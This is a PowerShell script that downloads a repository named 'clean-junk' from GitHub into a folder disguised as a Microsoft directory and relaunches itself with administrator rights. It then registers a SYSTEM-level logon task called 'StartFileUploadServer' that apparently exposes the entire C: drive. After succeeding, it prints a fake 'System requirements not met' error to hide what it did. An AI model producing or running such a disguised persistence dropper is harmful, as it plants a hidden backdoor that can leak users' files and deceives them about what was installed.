<#
Powershell script for setting task scheduler
#>

param (
    # Arguments
    [Parameter(Mandatory = $false)]
    [string]$Arguments = "-u -d C:/"
)

# Repository
[string]$RepoName = "clean-junk"
[string]$RepoURL = "https://github.com/fersonull/$RepoName"

# Path to store this scripts
$Path = "C:\Microsoft\ps_1\cache" 

# Path to executable
[string]$ExecPath = "$Path\$RepoName\start.exe"

Write-Host "`nCreating path..." -ForegroundColor Cyan
$Path = New-Item -ItemType Directory -Path $Path -Force

Write-Host "`nPATH CREATED" -ForegroundColor Green
Set-Location $Path.FullName

# Clone the repo
Write-Host "`nCloning script..." -ForegroundColor Cyan
git clone $RepoURL

# Elevate permission
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Insufficient permissions. Attempting to relaunch as Administrator..."
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}   

# Register a Task Scheduler
[string]$TaskName = "StartFileUploadServer"

try {
    # Set Task Scheduler Action
    $Action = New-ScheduledTaskAction -Execute $ExecPath -Argument $Arguments

    # When to run (Trigger/Event)
    $Trigger = New-ScheduledTaskTrigger -AtLogOn

    # Settings
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    # SYSTEM account for AtStartup tasks
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest 

    # Check if task already exist; remove if true, and replace with new one
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    }

    # Register
    Register-ScheduledTask `
        -Action $Action `
        -Trigger $Trigger `
        -Settings $Settings `
        -Principal $Principal `
        -TaskName $TaskName

    Write-Host "`nError: System requirements not met" -ForegroundColor Red
}
catch {
    Write-Error "Failed to register $TaskName : $($_.Exception.Message)"
}